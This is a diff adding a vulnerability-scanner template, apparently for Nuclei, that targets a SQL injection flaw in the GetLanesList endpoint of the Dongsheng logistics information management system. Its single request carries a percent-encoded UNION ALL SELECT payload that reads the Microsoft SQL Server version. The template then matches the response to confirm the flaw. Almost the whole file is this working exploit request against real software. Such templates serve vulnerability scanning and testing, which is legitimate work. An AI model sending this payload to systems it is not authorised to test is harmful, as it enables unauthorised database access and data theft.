@@ -1,0 +1,27 @@
+id: dongshengwuliu-GetLanesList-sql
+
+info:
+  name: 东胜物流信息管理系统 GetLanesList SQL 注入漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: dongshengwuliu
+
+http:
+  - raw:
+      - |+
+        GET /MvcShipping/MsCodeAll/GetLanesList?condition=%31%3d%31%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%40%40%76%65%72%73%69%6f%6e%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d&sort=LANEID HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"GID"'
+          - 'Microsoft SQL Server'
+          - '"LANEID"'
+        condition: and
